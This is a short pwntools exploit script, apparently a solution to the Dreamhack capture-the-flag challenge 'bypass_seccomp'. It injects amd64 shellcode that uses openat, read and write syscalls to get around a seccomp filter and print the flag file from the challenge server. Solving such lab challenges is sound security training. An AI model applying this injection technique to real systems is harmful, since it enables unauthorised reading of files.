from pwn import *

p = remote("host3.dreamhack.games",16453)

context.arch='amd64'
r="/home/bypass_seccomp/flag"

shellcode = ''
shellcode += shellcraft.openat(0,r)
shellcode += shellcraft.read('rax','rsp',0x80)

shellcode += shellcraft.write(1,'rsp',0x80)

p.recvuntil("shellcode:")
p.sendline(asm(shellcode))
print(p.recv())
